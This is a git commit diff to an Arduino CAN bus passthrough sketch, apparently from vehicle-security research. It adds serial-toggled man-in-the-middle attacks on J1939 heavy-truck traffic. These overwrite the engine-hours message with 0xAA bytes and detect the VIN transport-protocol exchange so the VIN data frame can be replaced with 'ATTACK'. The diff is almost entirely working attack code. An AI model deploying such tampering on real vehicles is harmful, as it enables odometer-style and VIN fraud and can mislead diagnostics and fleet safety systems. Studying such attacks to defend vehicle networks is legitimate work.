a6b0cd7a9f2efa2a7f9cb9e4a0388438297872ef
jeremy-daily <jeremy-daily@users.noreply.github.com>
2020-05-12 12:29:55 -0600

    Added logic for an attack node

--- passthrough_with_simple_attacks/passthrough_with_simple_attacks.ino
+++ passthrough_with_simple_attacks/passthrough_with_simple_attacks.ino
@@ -13,7 +13,9 @@ boolean GREEN_LED_state;
 boolean YELLOW_LED_state;
 boolean AMBER_LED_state;
 
-boolean attack_state;
+boolean engine_hours_attack_state;
+boolean transport_message_attack_state;
+boolean vin_attack_state;
 
 uint32_t vehicle_rx_count;
 uint32_t ecu_rx_count;
@@ -57,13 +59,40 @@ void rx_vehicle_msg(const CAN_message_t &msg){
 }
 
 void rx_ecu_can(CAN_message_t &msg){
-  if (attack_state){
+  if (engine_hours_attack_state){
     if (msg.id == 0x18FEE500){// Engine hours from engine #1
+      Serial.println("Changing Message for Hours.");
       msg.buf[0]=0xAA;
       msg.buf[1]=0xAA;
       msg.buf[2]=0xAA;
       msg.buf[3]=0xAA;
     }
+  }
+  if (vin_attack_state){
+    if ((msg.id & 0x00FFFFFF) == 0x00ECFF00){
+      Serial.println("Found Transport Protocol Connection Management Message.");
+      if (msg.buf[6] == 0xFE && msg.buf[5] == 0xEC){
+        Serial.println("Found VIN Transport Setup Message.");
+        transport_message_attack_state = true;
+        vin_attack_state = false;
+      }
+    }
+  }
+  if (transport_message_attack_state){
+    if ((msg.id & 0x00FFFFFF) == 0x00EBFF00){// TP.DT messages
+      Serial.println("Found Transport Protocol Data Transfer Message.");
+      // Convert all in messages to an 
+      msg.buf[1]='A'; //0x61
+      msg.buf[2]='T'; //0x74
+      msg.buf[3]='T'; //0x74
+      msg.buf[4]='A';
+      msg.buf[5]='C';
+      msg.buf[6]='K';
+      msg.buf[7]=' ';
+      transport_message_attack_state = false;
+    }
+    
+   
   }
   ecu_rx_count++;
   YELLOW_LED_state = !YELLOW_LED_state;
@@ -76,11 +105,16 @@ void loop() {
 
   if (Serial.available()){
     char c = Serial.read();
-    while(Serial.read() > 0);
-    attack_state = !attack_state;
-    Serial.write(c);
+    while(Serial.read() > 0); //flush the read buffer
+    // If the character matches, toggle the attack.
+    if      (c == 'h') engine_hours_attack_state = !engine_hours_attack_state;
+    else if (c == 't') transport_message_attack_state = !transport_message_attack_state;
+    else if (c == 'v') vin_attack_state = !vin_attack_state;
+    Serial.println(c);
   }
-  RED_LED_state = attack_state;
+  RED_LED_state = (transport_message_attack_state ||
+                   engine_hours_attack_state ||
+                   vin_attack_state);
   
   digitalWrite(RED_LED,RED_LED_state);
   digitalWrite(GREEN_LED,GREEN_LED_state);
